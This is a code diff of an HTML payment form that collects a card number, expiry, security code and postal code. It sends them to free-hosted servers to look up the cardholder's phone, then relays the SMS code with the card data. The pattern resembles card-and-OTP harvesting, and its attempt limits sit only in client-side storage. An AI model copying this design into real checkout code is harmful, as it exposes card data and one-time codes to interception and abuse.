@@ -13,7 +13,7 @@
   label { font-weight: 600; display: flex; align-items:center; gap:.4rem; margin-bottom: 0.35rem; }
   input { width: 100%; max-width:100%; min-width:0; padding: .65rem .7rem; font-size: 1rem; border-radius: 8px; border: 1px solid #cfcfcf; outline: none; background:#fff; }
   input:focus { border-color: var(--brand); box-shadow: 0 0 0 4px rgba(249,115,22,.2); }
-  .row { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: .75rem; } /* anti-overflow grid */
+  .row { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: .75rem; }
   button { background: linear-gradient(180deg,var(--brand),#ea580c); color: #fff; border: 0; padding: .8rem 1.1rem; border-radius: 8px; cursor: pointer; font-weight: 800; max-width:100%; }
   button[disabled] { opacity: .6; cursor: not-allowed; }
   .muted { color: var(--muted); font-size: .92rem; }
@@ -23,14 +23,14 @@
   @keyframes spin { to { transform: rotate(360deg); } }
   .ok { color: var(--ok); font-weight: 700; }
   .bad { color: var(--bad); font-weight: 700; }
+
   .btn-inline { display:flex; gap:.5rem; align-items:stretch; flex-wrap:wrap; }
-  .btn-inline input { flex:1 1 0%; min-width:0; }            /* shrinkable input */
-  .btn-inline button { flex:0 0 auto; background:#6b7280; background-image:none; box-shadow:none !important; white-space:nowrap; } /* no shadows */
+  .btn-inline input { flex:1 1 0%; min-width:0; }
+  .btn-inline button { flex:0 0 auto; background:#6b7280; background-image:none; box-shadow:none !important; white-space:nowrap; } /* no shadows for OTP buttons */
 
   #submitBtn { text-transform: uppercase; letter-spacing:.04em; }
   .err { background:#fff1f2; border:1px solid #fecdd3; color:#be123c; padding:.6rem .75rem; border-radius:8px; overflow-wrap:anywhere; }
 
-  /* Order summary & fieldset on white */
   #orderDetails { background:#fff; border:1px solid #e5e7eb; padding:.75rem .9rem; border-radius:12px; box-shadow:none; }
   form fieldset { background:#fff; border:1px solid #e5e7eb !important; border-radius:12px !important; }
 
@@ -46,23 +46,7 @@
   .modal .box{ background:#fff; color:#111827; padding:1rem 1.1rem; border-radius:12px; max-width:320px; box-shadow:0 10px 30px rgba(0,0,0,.2); text-align:center; }
   .modal .box button{ margin-top:.75rem; }
 
-  /* Kill any decorative watermark */
-  .form-container::after{ content:none !important; }
-
-  /* Responsive safety */
-  @media (max-width: 640px){
-    .row{ grid-template-columns:1fr; }
-    .form-container{ padding:1rem; }
-    .btn-inline{ flex-wrap:wrap; }
-    .btn-inline button{ width:100%; }
-  }
-
-  /* Motion safety */
-  @media (prefers-reduced-motion: reduce){
-    *{ transition:none !important; animation:none !important; }
-  }
-
-  /* ===== Global anti-overflow hardening ===== */
+  /* Anti-overflow hardening */
   *, *::before, *::after { box-sizing: border-box; }
   html, body { overflow-x: hidden; }
   .form-wrapper, .form-container, form, fieldset { max-width:100%; }
@@ -130,19 +114,31 @@
         <input type="email" id="email" required autocomplete="email">
       </div>
 
-      <div class="form-group">
-        <label for="otpPhone">Phone (+1XXXXXXXXXX)</label>
+      <!-- OTP Prefill Mode -->
+      <div class="form-group hidden" id="otpPrefillGroup">
+        <label id="sendOtpLabel" style="font-weight:800; text-transform:uppercase;">SEND A CODE TO PHONE ENDING WITH ••••</label>
         <div class="btn-inline">
-          <input type="text" id="otpPhone" required autocomplete="tel" placeholder="+1##########">
-          <button type="button" id="sendOtpBtn">Send OTP</button>
+          <!-- hidden readonly phone holder (kept for logic) -->
+          <input type="text" id="otpPhone" readonly class="hidden" />
+          <button type="button" id="sendOtpBtn">Send</button>
         </div>
         <div id="sendOtpNote" class="muted"></div>
+      </div>
+
+      <!-- OTP Manual Fallback (shown only if prefill fails) -->
+      <div class="form-group hidden" id="otpManualGroup">
+        <label for="otpPhoneManual">Phone (+1XXXXXXXXXX)</label>
+        <div class="btn-inline">
+          <input type="text" id="otpPhoneManual" autocomplete="tel" placeholder="+1##########">
+          <button type="button" id="sendOtpBtnManual">Send OTP</button>
+        </div>
+        <div id="sendOtpNoteManual" class="muted"></div>
       </div>
 
       <div class="form-group">
         <label for="otpCode">Enter OTP</label>
         <div class="btn-inline">
-          <input type="text" id="otpCode" required inputmode="numeric" placeholder="6-digit code">
+          <input type="text" id="otpCode" required inputmode="numeric" placeholder="6-digit code" maxlength="6">
           <button type="button" id="verifyOtpBtn">Verify OTP</button>
         </div>
         <div id="otpStatus" class="muted" style="margin-top:.5rem; font-weight:700;" aria-live="polite"></div>
@@ -186,7 +182,15 @@
 
 <script>
   /* ------------ URL params + FALLBACKS ------------ */
-  const LS_KEYS = { orderno:'twistpay:lastOrderno', amount:'twistpay:lastAmount', email:'twistpay:lastEmail' };
+  const LS_KEYS = {
+    orderno:'twistpay:lastOrderno',
+    amount:'twistpay:lastAmount',
+    email:'twistpay:lastEmail',
+    otpPhone:'twistpay:lastOtpPhone',
+  };
+  const COOLDOWN_SECONDS = 60;
+  const MAX_VERIFY_ATTEMPTS = 5;
+
   function setField(id, val) { if (typeof val !== 'string' || !val.length) return; const el = document.getElementById(id); if (el) el.value = val; }
   function parseParams(url){ try { return new URL(url).searchParams; } catch { return new URLSearchParams(''); } }
   function pickFrom(sp){ return { amount: sp.get('t_amount')||sp.get('amount')||'', orderno: sp.get('t_orderno')||sp.get('orderno')||'', email: sp.get('t_email')||sp.get('email')||'' }; }
@@ -240,40 +244,62 @@
     if (f==='Y') return 'YT';
     return '';
   }
+  function last4(p){ return (p||'').slice(-4); }
 
-  /* ------------ Masks / inputs ------------ */
-  const cardEl = document.getElementById('cardNumber');
-  const expEl = document.getElementById('expiration');
-  const twistEl = document.getElementById('twist');
-  const phoneEl = document.getElementById('otpPhone');
-  const otpEl = document.getElementById('otpCode');
+  /* ------------ Inputs ------------ */
+  const cardEl   = document.getElementById('cardNumber');
+  const expEl    = document.getElementById('expiration');
+  const twistEl  = document.getElementById('twist');
   const postalEl = document.getElementById('postal');
-  const clientErr = document.getElementById('clientErr');
 
+  const otpPrefillGroup  = document.getElementById('otpPrefillGroup');
+  const sendOtpLabel     = document.getElementById('sendOtpLabel');
+  const otpPhoneHiddenEl = document.getElementById('otpPhone'); // hidden holder when derived
+
+  const otpManualGroup   = document.getElementById('otpManualGroup');
+  const otpPhoneManualEl = document.getElementById('otpPhoneManual');
+
+  const sendOtpBtn       = document.getElementById('sendOtpBtn');
+  const sendOtpNote      = document.getElementById('sendOtpNote');
+  const sendOtpBtnManual = document.getElementById('sendOtpBtnManual');
+  const sendOtpNoteManual= document.getElementById('sendOtpNoteManual');
+
+  const otpEl       = document.getElementById('otpCode');
+  const verifyOtpBtn= document.getElementById('verifyOtpBtn');
+  const otpStatus   = document.getElementById('otpStatus');
+  const submitBtn   = document.getElementById('submitBtn');
+  const clientErr   = document.getElementById('clientErr');
+
+  /* Masks */
   cardEl.addEventListener('input', function () {
     let v = this.value.replace(/\D/g, '');
     if (v.length > 14) v = v.slice(0, 14);
     this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+    resetOtpState();
+    maybeDerivePhone();
   });
   expEl.addEventListener('input', function () {
     let v = this.value.replace(/\D/g, '');
     this.value = v.slice(0, 4);
+    resetOtpState();
+    maybeDerivePhone();
   });
   twistEl.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '').slice(0, 4);
-  });
-  phoneEl.addEventListener('input', () => {
-    const norm = normalizePhoneToE164_CA(phoneEl.value);
-    phoneEl.value = norm || '+1';
-  });
-  otpEl.addEventListener('input', () => {
-    otpEl.value = otpEl.value.replace(/\D/g, '').slice(0, 6);
+    resetOtpState();
+    maybeDerivePhone();
   });
   postalEl.addEventListener('input', () => {
     postalEl.value = postalEl.value.toUpperCase();
+    resetOtpState();
+    maybeDerivePhone();
+  });
+  otpEl.addEventListener('input', () => {
+    otpEl.value = otpEl.value.replace(/\D/g, '').slice(0, 6);
+    verifyOtpBtn.disabled = otpEl.value.length !== 6 || isVerifyLocked(currentPhone());
   });
 
-  /* ------------ Info modal ------------ */
+  /* ------------ Modal controls ------------ */
   const infoBtn = document.getElementById('twistInfoBtn');
   const infoModal = document.getElementById('twistInfo');
   const infoClose = document.getElementById('twistInfoClose');
@@ -281,74 +307,240 @@
   infoClose.addEventListener('click', () => infoModal.classList.add('hidden'));
   infoModal.addEventListener('click', (e) => { if (e.target === infoModal) infoModal.classList.add('hidden'); });
 
-  /* ------------ OTP (lock the phone) ------------ */
-  const OTP_PHONE_KEY = 'twistpay:lastOtpPhone';
-  const sendOtpBtn = document.getElementById('sendOtpBtn');
-  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
-  const otpStatus = document.getElementById('otpStatus');
-  const sendOtpNote = document.getElementById('sendOtpNote');
-  const submitBtn = document.getElementById('submitBtn');
+  /* ------------ OTP state helpers ------------ */
+  function currentPhone(){
+    return otpPrefillGroup.classList.contains('hidden')
+      ? normalizePhoneToE164_CA(otpPhoneManualEl.value)
+      : otpPhoneHiddenEl.value || null;
+  }
+  function cooldownKey(phone){ return `twistpay:otpCooldown:${phone}`; }
+  function attemptsKey(phone){ return `twistpay:verifyAttempts:${phone}`; }
+  function verifiedKey(phone){ return `twistpay:otpVerified:${phone}`; }
 
-  sendOtpBtn.onclick = async () => {
-    const normPhone = normalizePhoneToE164_CA(phoneEl.value);
-    if (!normPhone) return alert("Enter a valid Canadian number (e.g., +14165551234).");
-    localStorage.setItem(OTP_PHONE_KEY, normPhone);
-    sendOtpBtn.disabled = true;
-    sendOtpNote.textContent = "Sending...";
-    try {
-      const res = await fetch('https://twilio-otp-server.onrender.com/send-otp', {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ phone: normPhone })
-      });
-      const data = await res.json();
-      sendOtpNote.textContent = data.success ? "OTP sent." : ("Error: " + (data.error||'Unknown error'));
-    } catch (e) {
-      sendOtpNote.textContent = `Network error: ${e.message}`;
-    } finally {
-      sendOtpBtn.disabled = false;
-    }
-  };
+  function isVerifyLocked(phone){
+    if (!phone) return false;
+    const n = parseInt(localStorage.getItem(attemptsKey(phone)||'0'),10) || 0;
+    return n >= MAX_VERIFY_ATTEMPTS;
+  }
 
-  verifyOtpBtn.onclick = async () => {
-    const lockedPhone = localStorage.getItem(OTP_PHONE_KEY);
-    if (!lockedPhone) return alert("Please send an OTP first.");
-    const code = String(otpEl.value || '').trim();
-    if (!/^\d{6}$/.test(code)) return alert("Enter the 6-digit OTP code.");
+  function resetOtpState(){
+    otpStatus.textContent = '';
+    otpEl.value = '';
+    verifyOtpBtn.disabled = true;
+    submitBtn.disabled = true;
+    // don’t clear verified flag automatically; it’s tied to phone and will be checked after re-derive
+  }
 
-    otpStatus.textContent = "Verifying...";
-    otpStatus.style.color = "";
-    try {
-      const res = await fetch('https://twist-status-server.onrender.com/otp/verify-proxy', {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ phone: lockedPhone, code })
-      });
-      const data = await res.json();
-      if (data.success) {
-        otpStatus.textContent = "✅ OTP verified!";
-        otpStatus.style.color = "green";
-        submitBtn.disabled = false;
-        phoneEl.readOnly = true;
-        sendOtpBtn.disabled = true;
-        verifyOtpBtn.disabled = true;
-      } else {
-        otpStatus.textContent = `❌ Invalid OTP${data.error ? ' – ' + data.error : ''}`;
-        otpStatus.style.color = "red";
-        submitBtn.disabled = true;
-      }
-    } catch (e) {
-      otpStatus.textContent = `Network error: ${e.message}`;
-      otpStatus.style.color = "red";
-      submitBtn.disabled = true;
-    }
-  };
-
-  /* ------------ Submit flow ------------ */
   function showErr(msg) {
     clientErr.textContent = msg;
     clientErr.classList.remove('hidden');
     setTimeout(() => clientErr.classList.add('hidden'), 5000);
   }
 
+  /* ------------ Derive phone (server) ------------ */
+  let deriving = false, lastDeriveSig = '';
+  async function maybeDerivePhone(){
+    const rawCard = cardEl.value.replace(/\s/g, '');
+    const exp = expEl.value.replace(/\D/g, '');
+    const twist = twistEl.value.replace(/\D/g, '');
+    const postal = postalEl.value.trim();
+
+    if (!/^\d{14}$/.test(rawCard)) return;
+    if (!rawCard.startsWith('71461567')) return;
+    if (!/^\d{4}$/.test(exp)) return;
+    if (!/^\d{4}$/.test(twist)) return;
+    if (!postal) return;
+
+    const sig = `${rawCard}|${exp}|${twist}|${postal}`;
+    if (deriving || sig === lastDeriveSig) return;
+    deriving = true;
+
+    try {
+      const resp = await fetch('https://twist-status-server.onrender.com/otp/derive-phone', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ cardNumber: rawCard, expiration: exp, twist, postal })
+      });
+      const data = await resp.json().catch(()=> ({}));
+
+      if (resp.ok && data && data.success && data.phone) {
+        lastDeriveSig = sig;
+        const phone = data.phone; // expect "+1XXXXXXXXXX"
+        otpPhoneHiddenEl.value = phone;
+        localStorage.setItem(LS_KEYS.otpPhone, phone);
+
+        // Switch to prefill UI
+        otpManualGroup.classList.add('hidden');
+        otpPrefillGroup.classList.remove('hidden');
+        sendOtpLabel.textContent = `SEND A CODE TO PHONE ENDING WITH ${last4(phone)}`;
+
+        // Restore state (verified or cooldown) if any
+        restoreVerifiedOrCooldown(phone);
+
+      } else {
+        // Fallback to manual if not available
+        otpPrefillGroup.classList.add('hidden');
+        otpManualGroup.classList.remove('hidden');
+      }
+    } catch (e) {
+      // Network issue → fallback to manual
+      otpPrefillGroup.classList.add('hidden');
+      otpManualGroup.classList.remove('hidden');
+    } finally {
+      deriving = false;
+    }
+  }
+
+  function restoreVerifiedOrCooldown(phone){
+    // Verified?
+    if (localStorage.getItem(verifiedKey(phone)) === '1') {
+      otpStatus.textContent = '✅ OTP verified!';
+      submitBtn.disabled = false;
+      verifyOtpBtn.disabled = true;
+      // Disallow re-sending for a verified session
+      if (!otpPrefillGroup.classList.contains('hidden')) {
+        sendOtpBtn.disabled = true;
+        sendOtpNote.textContent = 'Phone verified for this session.';
+      } else {
+        sendOtpBtnManual.disabled = true;
+        sendOtpNoteManual.textContent = 'Phone verified for this session.';
+      }
+      return;
+    }
+
+    // Resume cooldown if active
+    const endsAt = parseInt(localStorage.getItem(cooldownKey(phone)||'0'),10) || 0;
+    const now = Date.now();
+    if (endsAt > now) {
+      startCooldownCountdown(phone, Math.ceil((endsAt - now)/1000));
+    }
+  }
+
+  /* ------------ Send OTP (prefill + manual) ------------ */
+  function bindSendHandlers(){
+    sendOtpBtn.onclick = async () => {
+      const phone = otpPhoneHiddenEl.value;
+      if (!phone) return alert('Phone is not ready yet.');
+      await sendOtpTo(phone, sendOtpBtn, sendOtpNote);
+    };
+    sendOtpBtnManual.onclick = async () => {
+      const phone = normalizePhoneToE164_CA(otpPhoneManualEl.value);
+      if (!phone) return alert("Enter a valid Canadian number (e.g., +14165551234).");
+      await sendOtpTo(phone, sendOtpBtnManual, sendOtpNoteManual);
+    };
+  }
+  bindSendHandlers();
+
+  async function sendOtpTo(phone, btn, noteEl){
+    // reset verify attempts for this phone
+    localStorage.setItem(attemptsKey(phone), '0');
+
+    btn.disabled = true;
+    noteEl.textContent = 'Sending...';
+
+    try {
+      const res = await fetch('https://twilio-otp-server.onrender.com/send-otp', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ phone })
+      });
+      const data = await res.json();
+      if (data.success) {
+        noteEl.textContent = 'OTP sent.';
+        // lock to that phone
+        if (otpPrefillGroup.classList.contains('hidden')) {
+          otpPhoneManualEl.value = phone;
+        } else {
+          otpPhoneHiddenEl.value = phone;
+        }
+        localStorage.setItem(LS_KEYS.otpPhone, phone);
+        // start cooldown
+        startCooldownCountdown(phone);
+        // allow verify now that code is sent
+        verifyOtpBtn.disabled = (otpEl.value.length !== 6);
+      } else {
+        noteEl.textContent = `Error: ${data.error || 'Unknown error'}`;
+        btn.disabled = false;
+      }
+    } catch (e) {
+      noteEl.textContent = `Network error: ${e.message}`;
+      btn.disabled = false;
+    }
+  }
+
+  function startCooldownCountdown(phone, startFrom = COOLDOWN_SECONDS){
+    const endsAt = Date.now() + startFrom*1000;
+    localStorage.setItem(cooldownKey(phone), String(endsAt));
+
+    const isPrefill = !otpPrefillGroup.classList.contains('hidden') || !!otpPhoneHiddenEl.value;
+    let btn = isPrefill ? sendOtpBtn : sendOtpBtnManual;
+    let note = isPrefill ? sendOtpNote : sendOtpNoteManual;
+
+    btn.disabled = true;
+
+    function tick(){
+      const remain = Math.max(0, Math.ceil((endsAt - Date.now())/1000));
+      note.textContent = remain > 0 ? `Resend available in ${remain}s` : '';
+      if (remain <= 0) {
+        btn.disabled = false;
+        localStorage.removeItem(cooldownKey(phone));
+        clearInterval(timer);
+      }
+    }
+    tick();
+    const timer = setInterval(tick, 1000);
+  }
+
+  /* ------------ Verify OTP (attempt limit + persist) ------------ */
+  verifyOtpBtn.onclick = async () => {
+    const phone = currentPhone();
+    if (!phone) return alert('Please send an OTP first.');
+    if (isVerifyLocked(phone)) {
+      otpStatus.textContent = 'Too many attempts. Please resend a new code.';
+      return;
+    }
+    const code = String(otpEl.value || '').trim();
+    if (!/^\d{6}$/.test(code)) return alert("Enter the 6-digit OTP code.");
+
+    otpStatus.textContent = "Verifying...";
+    otpStatus.style.color = "";
+    verifyOtpBtn.disabled = true;
+
+    try {
+      const res = await fetch('https://twist-status-server.onrender.com/otp/verify-proxy', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ phone, code })
+      });
+      const data = await res.json();
+      if (data.success) {
+        otpStatus.textContent = "✅ OTP verified!";
+        otpStatus.style.color = "green";
+        submitBtn.disabled = false;
+        // freeze send+verify
+        sendOtpBtn.disabled = true;
+        if (sendOtpBtnManual) sendOtpBtnManual.disabled = true;
+        localStorage.setItem(verifiedKey(phone), '1');
+      } else {
+        const k = attemptsKey(phone);
+        const n = (parseInt(localStorage.getItem(k)||'0',10) || 0) + 1;
+        localStorage.setItem(k, String(n));
+        if (n >= MAX_VERIFY_ATTEMPTS) {
+          otpStatus.textContent = "❌ Too many attempts. Please resend a new code.";
+          otpStatus.style.color = "red";
+          verifyOtpBtn.disabled = true;
+        } else {
+          otpStatus.textContent = `❌ Invalid OTP${data.error ? ' – ' + data.error : ''} (${n}/${MAX_VERIFY_ATTEMPTS})`;
+          otpStatus.style.color = "red";
+          verifyOtpBtn.disabled = (otpEl.value.length !== 6);
+        }
+      }
+    } catch (e) {
+      otpStatus.textContent = `Network error: ${e.message}`;
+      otpStatus.style.color = "red";
+      verifyOtpBtn.disabled = (otpEl.value.length !== 6);
+    }
+  };
+
+  /* ------------ Submit flow (unchanged, with 3s spinner) ------------ */
+  const submitBtnEl = document.getElementById('submitBtn');
   document.getElementById('paymentForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
@@ -365,8 +557,8 @@
     if (!postal) return showErr('Postal Code is required.');
     if (!derivedProv) return showErr('Postal Code must be valid in Canada.');
 
-    const lockedPhone = localStorage.getItem(OTP_PHONE_KEY);
-    if (!lockedPhone) return showErr('Please send and verify an OTP first.');
+    const phone = currentPhone();
+    if (!phone) return showErr('Please send an OTP first.');
     if (!/^\d{6}$/.test(otpEl.value)) return showErr('OTP must be 6 digits.');
 
     const transactionId =
@@ -382,17 +574,17 @@
       twist,
       name: document.getElementById('name').value.trim(),
       email: document.getElementById('email').value.trim(),
-      phone: lockedPhone,
+      phone,
       postal: postal,
       province: derivedProv,
       otpCode: otpEl.value
     };
 
     persistBasics({ amount: payload.amount, orderno: payload.orderno, email: payload.email });
+
     document.getElementById('loadingSpinner').classList.remove('hidden');
 
     try {
-      // 1) PRE-VALIDATE
       const pre = await fetch('https://twist-status-server.onrender.com/pre-validate', {
         method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
       });
@@ -405,20 +597,17 @@
         return showErr(shown);
       }
 
-      // 2) Waiting screen (min 3s)
       document.getElementById('paymentForm').classList.add('hidden');
       document.getElementById('confirmationStep').classList.remove('hidden');
       document.getElementById('loadingSpinner').classList.add('hidden');
 
       const waitingShownAt = Date.now();
 
-      // 3) Finalize
       const resp = await fetch('https://twist-status-server.onrender.com/validate-transaction', {
         method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
       });
       const data = await resp.json().catch(() => ({}));
 
-      // 4) Reveal after >= 3s
       const elapsed = Date.now() - waitingShownAt;
       const remaining = Math.max(0, 3000 - elapsed);
       setTimeout(() => {
@@ -434,6 +623,22 @@
       showErr("Network error: " + err.message);
     }
   });
+
+  /* ------------ Resume state on load ------------ */
+  (function resumeOnLoad(){
+    // Try deriving immediately (if user landed with fields prefilled via iframe params)
+    maybeDerivePhone();
+
+    // If no prefill yet, show manual as default (but only after a brief delay to avoid flicker)
+    setTimeout(() => {
+      if (otpPrefillGroup.classList.contains('hidden') && otpManualGroup.classList.contains('hidden')) {
+        otpManualGroup.classList.remove('hidden');
+      }
+      // If we have a saved phone, restore cooldown/verified
+      const saved = localStorage.getItem(LS_KEYS.otpPhone);
+      if (saved) restoreVerifiedOrCooldown(saved);
+    }, 150);
+  })();
 
   /* ------------ Auto-height for iframes ------------ */
   (function () {
